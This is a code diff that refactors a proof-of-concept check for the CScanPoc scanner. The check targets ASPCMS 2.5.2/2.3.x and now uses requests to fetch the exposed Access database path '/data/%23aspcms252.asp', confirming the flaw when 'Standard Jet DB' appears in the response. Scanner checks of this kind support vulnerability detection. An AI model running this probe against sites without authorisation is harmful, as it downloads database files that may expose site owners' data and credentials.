@@ -3,10 +3,6 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
-import urllib.request
-import urllib.error
-import urllib.parse
-import http.cookiejar
 
 
 class Vuln(ABVuln):
@@ -23,17 +19,6 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'ASPCMS'  # 漏洞应用名称
     product_version = 'ASPCMS最新版2.5.2以及ASPCMS2.3.x'  # 漏洞应用版本
-
-
-class NoExceptionCookieProcesser(urllib.request.HTTPCookieProcessor):
-    def http_error_403(self, req, fp, code, msg, hdrs):
-        return fp
-
-    def http_error_400(self, req, fp, code, msg, hdrs):
-        return fp
-
-    def http_error_500(self, req, fp, code, msg, hdrs):
-        return fp
 
 
 class Poc(ABPoc):
@@ -62,19 +47,12 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-
+            payload = "/data/%23aspcms252.asp"
             # http://www.wooyun.org/bugs/wooyun-2010-060483
-            cookie = http.cookiejar.CookieJar()
-            cookie_handler = NoExceptionCookieProcesser(cookie)
-            opener = urllib.request.build_opener(
-                cookie_handler, urllib.request.HTTPHandler)
-            opener.open(self.target + '/data/%23aspcms252.asp')
-            urllib.request.install_opener(opener)
-            content = urllib.request.urlopen(self.target).read()
-
+            content = requests.get(self.target+payload).text
             if 'Standard Jet DB' in content:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
+                    target=self.target, name=self.vuln.name,url=self.target+payload))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
